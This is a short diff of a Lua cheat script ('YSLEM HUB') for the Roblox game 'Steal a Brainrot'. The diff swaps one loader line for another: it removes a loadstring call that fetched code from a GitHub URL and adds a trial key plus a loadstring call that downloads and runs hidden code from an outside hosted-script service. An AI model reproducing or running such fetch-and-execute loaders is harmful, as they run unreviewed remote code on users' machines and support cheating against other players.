@@ -1,9 +1,6 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ys2ueio/script-/refs/heads/main/yslem_hub.lua"))()--[[
--- ===================================================================
--- YSLEM HUB v2 — Steal a Brainrot
--- UI redesign + Auto Carry on Grab + fixes
--- ===================================================================
-]]
+script_key = "TRIAL"
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/0bc0893d430ef818aa3a0c6b0d4ac606820bfdb3dbed2bbdbfa672a238cdd7a1.lua"))()
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UIS = game:GetService("UserInputService")
